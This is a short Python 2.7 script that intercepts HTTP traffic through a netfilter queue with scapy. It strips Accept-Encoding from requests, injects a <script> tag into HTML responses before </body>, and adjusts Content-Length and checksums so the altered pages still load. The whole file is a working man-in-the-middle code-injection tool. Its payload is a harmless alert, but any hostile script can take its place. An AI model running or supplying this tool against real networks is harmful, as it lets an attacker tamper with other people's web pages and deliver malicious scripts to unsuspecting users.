#!/usr/bin/python2.7

import netfilterqueue
import scapy.all as scapy
import re


ack_list=[]

def set_load(packet,load):
	packet[scapy.Raw].load=load
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum
	return packet

def process_packet(packet):

	scapy_packet=scapy.IP(packet.get_payload())

	if scapy_packet.haslayer(scapy.Raw):
		load=scapy_packet[scapy.Raw].load

		if scapy_packet[scapy.TCP].dport == 80:
			print "[+]Request "
			load = re.sub("Accept-Encoding:.*?\\r\\n","",scapy_packet[scapy.Raw].load)
			
		elif scapy_packet[scapy.TCP].sport == 80:
			print "[+] Response "
			before_injection=load
			injection_code="<script>alert('test');</script>"

			load=load.replace("</body>",injection_code+"</body>")
			after_injection=load

			if len(before_injection) != len(after_injection):

				content_length_search = re.search("(?:Content-Length:\s)(\d*)",load)
				
				if content_length_search and "text/html" in load:
					content_length=content_length_search.group(1)
					new_content_length=int(content_length)+len(injection_code)
					print"content length %s new content length %s"%(content_length,new_content_length)
					load = load.replace(content_length,str(new_content_length))

		if load != scapy_packet[scapy.Raw].load:
			new_packet=set_load(scapy_packet,load)
			packet.set_payload(str(new_packet))

	packet.accept()

queue=netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()